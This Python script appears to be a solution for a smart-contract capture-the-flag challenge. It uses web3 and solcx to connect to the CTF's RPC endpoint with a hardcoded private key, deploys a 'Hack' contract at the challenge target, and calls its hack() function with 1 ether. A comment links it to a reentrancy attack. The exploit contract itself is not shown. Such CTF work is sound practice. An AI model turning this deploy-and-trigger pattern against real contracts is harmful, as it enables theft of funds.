from web3 import Web3
from web3 import HTTPProvider
import solcx
import os


"""
https://github.com/foundry-rs/foundry

- Init new Project: forge init
- testing: forge test -vvv

Referensi: https://hackernoon.com/hack-solidity-reentrancy-attack
"""

RPC_URL = "http://ctf.ukmpcc.org:11661/2143b6e1-a723-4a08-9e7c-d1436695a668"
PRIVKEY = "0x82f87d645d0dcd306e271aa533efb179c8a4e8350ad281eef9adf2c2b367d037"
SETUP_CONTRACT_ADDR = "0xA655dDeD52aE264c8c9D9387B96Ed19405640ED2"

class Account:
    def __init__(self) -> None:
        self.w3 = Web3(HTTPProvider(RPC_URL))
        self.w3.eth.default_account = self.w3.eth.account.from_key(PRIVKEY).address
        self.account_address = self.w3.eth.default_account

    def get_balance(s, addr):
        print("balance:",s.w3.eth.get_balance(addr))


class BaseContractProps:
    def __init__(self, path: str) -> None:
        file, klass = path.split(':')
        self.__file = os.path.abspath(file)
        self.path = f"{self.__file}:{klass}"
    @property
    def abi(self):
        klass = solcx.compile_files(self.__file, output_values=["abi"])
        for klas in klass:
            if klas in self.path:
                return klass[klas]['abi']
        raise Exception("class not found")

    @property
    def bin(self):
        klass = solcx.compile_files(self.__file, output_values=["bin"])
        for klas in klass:
            if klas in self.path:
                return klass[klas]['bin']
        raise Exception("class not found")

class BaseDeployedContract(Account, BaseContractProps):
    def __init__(self, addr, file, abi=None) -> None:
        BaseContractProps.__init__(self, file)
        Account.__init__(self)
        self.address = addr
        if abi:
            self.contract = self.w3.eth.contract(addr, abi=abi)
        else:
            self.contract = self.w3.eth.contract(addr, abi=self.abi)

class BaseUndeployedContract(Account, BaseContractProps):
    def __init__(self, path) -> None:
        BaseContractProps.__init__(self,path)
        Account.__init__(self)
        self.contract = self.w3.eth.contract(abi=self.abi, bytecode=self.bin)

    def deploy_to_target(self, target):
        tx_hash = self.contract.constructor(target).transact()
        tx_receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash)
        return  BaseDeployedContract(tx_receipt.contractAddress, self.path)

class SetupContract(BaseDeployedContract):
    def __init__(self) -> None:
        super().__init__(
            addr=SETUP_CONTRACT_ADDR,
            file="../contracts/Setup.sol:Setup",
        )

    @property
    def target(self):
        return self.contract.functions.TARGET().call()

    def is_solved(s):
        result = s.contract.functions.isSolved().call()
        print("is solved:", result)

class HackContract(BaseUndeployedContract):
    def __init__(self) -> None:
        super().__init__("./Hack.sol:Hack")

if __name__ == "__main__":
    setup = SetupContract()
    hack = HackContract()
    hack_deployed = hack.deploy_to_target(setup.target)
    hack_deployed.contract.functions.hack().transact({"value":Web3.to_wei(1, "ether")})
    setup.is_solved()


